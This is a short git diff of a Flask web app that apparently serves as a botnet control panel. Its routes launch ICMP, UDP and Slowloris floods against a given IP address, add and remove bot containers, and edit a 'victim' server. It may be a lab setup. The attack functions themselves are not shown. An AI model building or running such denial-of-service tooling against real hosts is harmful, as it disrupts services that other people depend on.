@@ -42,6 +42,11 @@ def generate_botnet():
 def remove_botnet():
     return bot_management.remove_botnet()
 
+@app.route("/remove_bot", methods=["POST"])
+def remove_bot():
+    bot_id = request.form.get('container_id')
+    return bot_management.remove_bot(bot_id)
+
 
 @app.route("/icmp_flood", methods=["POST"])
 def icmp_flood():
@@ -51,12 +56,12 @@ def icmp_flood():
         db.icmp_flood_insert(ip_address)
     return "nothing"
 
-@app.route("/udp_flood", methods=["POST", "GET"])
-def udp_flood():
-    ip_address = request.form["ip_address"]
-    duration = int(request.form["attack_duration"])
-    attacks.execute_attack(attacks.udp_flood, duration, ip_address)
-    return "nothing"
+# @app.route("/udp_flood", methods=["POST", "GET"])
+# def udp_flood():
+#     ip_address = request.form["ip_address"]
+#     duration = int(request.form["attack_duration"])
+#     attacks.execute_attack(attacks.udp_flood, duration, ip_address)
+#     return "nothing"
 
 
 @app.route("/slowloris", methods=["POST"])
@@ -112,8 +117,8 @@ def show_botnet():
 @app.route("/stop_attack")
 def stop_attack():
     attacks.execute_attack(attacks.stop_attack)
-
     return "nothing"
+    
 @app.route("/edit_victim", methods=["POST", "GET"])
 def edit_victim():
     apache_version = request.form["apache_version"]
